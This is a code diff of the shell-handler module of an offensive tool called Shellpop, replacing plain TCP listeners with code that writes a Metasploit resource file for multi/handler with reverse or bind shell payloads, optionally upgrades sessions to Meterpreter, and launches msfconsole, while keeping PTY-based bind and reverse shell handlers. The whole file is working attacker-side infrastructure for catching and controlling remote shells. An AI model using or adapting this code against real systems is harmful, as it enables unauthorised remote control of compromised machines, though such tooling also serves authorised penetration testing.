@@ -1,20 +1,18 @@
 #!/usr/bin/env python2
-# PTY, TcpPtyHandler classes were extracted from this URL
-# https://github.com/infodox/python-pty-shells/blob/master/pty_shell_handler.py
-# This is not official code of "Shellpop" project.
-
-# The other classes, are.
+# Full stager remake. Now I am going to lead a major change in this functionality.
+# I am going to lendo multi/handler module of Metasploit Framework to do this job.
+# This is going to be done mostly because of meterpreter upgrade possibility.
 
 from shellpop import *
-from threading import Thread
 from time import sleep
 import termios
 import select
 import socket
 import os
 import fcntl
-import sys
-
+import string
+import random
+from os import path, system
 
 class PTY:
     def __init__(self, slave=0, pid=os.getpid()):
@@ -26,7 +24,7 @@ class PTY:
         self.pty  = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")
 
         # store our old termios settings so we can restore after
-        # we are finished 
+        # we are finished
         self.oldtermios = termios.tcgetattr(self.pty)
 
         # get the current settings se we can modify them
@@ -67,32 +65,32 @@ class PTY:
         self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)
 
 
-class TcpPtyHandler(object):
-    def __init__(self, address, is_bind=True):
-        self.bind = is_bind  # boolean to check if it is bind shell.
-        self.address = address
+class TCP_PTY_Handler(object):
+    def __init__(self, addr, bind=True):
+        self.bind = bind
+        self.addr = addr
 
         if self.bind:
             self.sock = socket.socket()
-            self.sock.bind(self.address)
+            self.sock.bind(self.addr)
             self.sock.listen(5)
 
-    def handle(self, address=None):
-        address = address or self.address
+    def handle(self, addr=None):
+        addr = addr or self.addr
         if self.bind is True:
             print(info("Waiting for connections ..."))
-            sock, address = self.sock.accept()
-            print(info("Connection inbound from {0}:{1}".format(self.address[0], self.address[1])))
+            sock, addr = self.sock.accept()
+            print(info("Connection inbound from {0}:{1}".format(self.addr[0], self.addr[1])))
         else:
             sock = socket.socket()
             print(info("Waiting up to 10 seconds to start establishing the connection ..."))
             sleep(10)
-            
+
             print(info("Connecting to remote endpoint ..."))
             n = 0
             while n < 10:
                 try:
-                    sock.connect(address)
+                    sock.connect(addr)
                     print(info("Connection to remote endpoint established."))
                     break
                 except socket.error:
@@ -100,15 +98,15 @@ class TcpPtyHandler(object):
                     n += 1
                     sleep(5)
 
+
         # create our PTY
         pty = PTY()
 
         # input buffers for the fd's
         buffers = [ [ sock, [] ], [ pty, [] ] ]
-
-        def buffer_index(file_descriptor):
+        def buffer_index(fd):
             for index, buffer in enumerate(buffers):
-                if buffer[0] == file_descriptor:
+                if buffer[0] == fd:
                     return index
 
         readable_fds = [ sock, pty ]
@@ -149,102 +147,116 @@ class TcpPtyHandler(object):
         sock.close()
 
 
-class TcpHandler(object):
+
+def error(err):
+    return "[\033[091m!\033[0m] Error: {0}".format(err)
+
+
+def random_file(n=10):
     """
-    TCP handler class to get our shells!
-    @zc00l
+    Generates a random rc file in /tmp/folder.
     """
-    def __init__(self, conn_info, bind=True):
-        self.conn_info = conn_info
-        self.bind = bind
-        self.sock = None
+    file_name = str()
+    while len(file_name) < n:
+        chosen = list(string.letters)[random.randint(1, len(string.letters))-1]
+        file_name += chosen
+    return "/tmp/" + file_name + ".rc"
 
-    @staticmethod
-    def read_and_loop(sock):
-        while True:
-            try:
-                data = sock.recv(1024)
-                if data and len(data) > 0:
-                    sys.stdout.write(data)
-            except socket.timeout:
-                sleep(1)
-            except KeyboardInterrupt:
-                sock.close()
-                return 0
-            except socket.error:
-                print(error("Exiting shell handler ...."))
-                sock.close()
-                return 0
 
-    @staticmethod
-    def write_and_loop(sock):
-        while True:
-            try:
-                s = raw_input("")
-                if len(s) > 0:
-                    sock.send(s+"\n")
-                    if s.lower() == "exit":
-                        raise KeyboardInterrupt # we want exit!
-            except KeyboardInterrupt:
-                sock.close()
-                return 0
-            except:
-                pass
+class MetaHandler(object):
+    def __init__(self):
+        self.host = None
+        self.port = None
+        self.shell = None
+        self.payload = None
 
-    def handle(self):
-        sock = None
-        self.sock = socket.socket()
-        if self.bind is True:
-            self.sock.bind(self.conn_info)
-            self.sock.listen(5)
+    def check_system(self, is_bind=False):
+        if self.shell.lower() == "cmd":
+            if is_bind is False:
+                self.payload = "windows/shell_reverse_tcp"
+            else:
+                self.payload = "windows/shell_bind_tcp"
+            return
+        elif self.shell.lower() == "powershell":
+            if is_bind is False:
+                self.payload = "windows/shell_reverse_tcp"
+            else:
+                self.payload = "windows/shell_bind_tcp"
+            return
+        elif self.shell.lower() == "bash":
+            if is_bind is False:
+                self.payload = "linux/x86/shell_reverse_tcp"
+            else:
+                self.payload = "linux/x86/shell_bind_tcp"
+            return
+        self.payload = "generic/shell_reverse_tcp"
 
-            sock, addr = self.sock.accept()
-            print(info("Connection inbound from {0}:{1}".format(addr[0], addr[1])))
-        else:  # reverse shell.
-            print(info("Waiting up to 10 seconds to start establishing the connection ..."))
-            sleep(10)
 
-            print(info("Connecting to remote endpoint ..."))
-            n = 0
-            while n < 10:
-                try:
-                    self.sock.connect(self.conn_info)
-                    sock = self.sock
-                    print(info("Connection to remote endpoint established."))
-                    break
-                except socket.error:
-                    print(error("Connection to remote endpoint could not be established."))
-                    n += 1
-                    sleep(4.5)
+class Generic(MetaHandler):
+    def __init__(self, conn, shell, is_bind=False):
+        self.file_name = random_file()
+        self.host = conn[0]
+        self.port = conn[1]
+        self.shell = shell
+        self.check_system(is_bind=is_bind)  # sets self.payload
 
-        if sock is None:  # we assume we have a connection by now.
-            print(error("No connection socket to use."))
-            exit(0)
+    def generate_rc_content(self, meterpreter=False):
+        """
+        Generate a rc content to be used in metasploit.
+        """
+        if meterpreter is True and self.shell.lower() != "powershell":  # Currently you will need to
+            # upgrade powershell sessions manually with "sessions -u "
+            return """setg SessionLogging true\nsetg TimestampOutput true\nsetg VERBOSE true\nuse exploit/multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset AutoRunScript post/multi/manage/shell_to_meterpreter\nrun -j\n""".format(self.payload, self.host, self.port)
         else:
-            sock.settimeout(0.5)
+             return """setg SessionLogging true\nsetg TimestampOutput true\nsetg VERBOSE true\nuse exploit/multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nrun -j\n""".format(self.payload, self.host, self.port)
 
-        t = Thread(target=self.read_and_loop, args=(sock,))
-        t.start()  # start the read in loop.
-        t2 = Thread(target=self.write_and_loop, args=(sock,))
-        t2.start()
-        t.join()
+    def _generate_execution_string(self):
+        return "msfconsole -q -r {0}".format(self.file_name)
+
+    def generate_and_execute(self, meterpreter=False):
+        if path.exists(self.file_name):
+            print(error("File already exists! Aborting :("))
+            return None
+        with open(self.file_name, "wb") as f:
+            f.write(self.generate_rc_content(meterpreter=meterpreter))
+
+        # Execute our .rc file to open metasploit handler.
+        system(self._generate_execution_string())
 
 
-def reverse_tcp_handler(conn_info):
-    handler = TcpHandler(conn_info, bind=True)
+def get_shell_name(shell_obj):
+    """
+    This ridiculously simple function is enough to determine
+    the receiving shell type for meterpreter upgrade.
+    """
+    if shell_obj.system_os == "linux":
+        return "bash"
+    if shell_obj.system_os == "windows":
+        if "powershell" in shell_obj.short_name:
+            return "powershell"
+        else:
+            return "cmd"
+
+
+def reverse_tcp_handler((args, shell)):
+    shell_name = get_shell_name(shell)
+    handler = Generic((args.host, args.port), shell_name, is_bind=False)
+    handler.generate_and_execute(meterpreter=args.meterpreter)
+
+
+def bind_tcp_handler((args, shell)):
+    shell_name = get_shell_name(shell)
+    handler = Generic((args.host, args.port), shell_name, is_bind=True)
+    handler.generate_and_execute(meterpreter=args.meterpreter)
+
+
+# I am keeping these handlers because of @Lowfuel
+
+def bind_tcp_pty_handler((args, shell)):
+    handler = TCP_PTY_Handler((args.host, args.port), bind=True)
     handler.handle()
 
 
-def bind_tcp_handler(conn_info):
-    handler = TcpHandler(conn_info, bind=False)
-    handler.handle()
-
-
-def reverse_tcp_pty_handler(conn_info):
-    handler = TcpPtyHandler(conn_info, is_bind=True)
-    handler.handle()
-
-
-def bind_tcp_pty_handler(conn_info):
-    handler = TcpPtyHandler(conn_info, is_bind=False)
+def reverse_tcp_pty_handler(args, shell):
+    handler = TCP_PTY_Handler((args.host, args.port), bind=False)
     handler.handle()
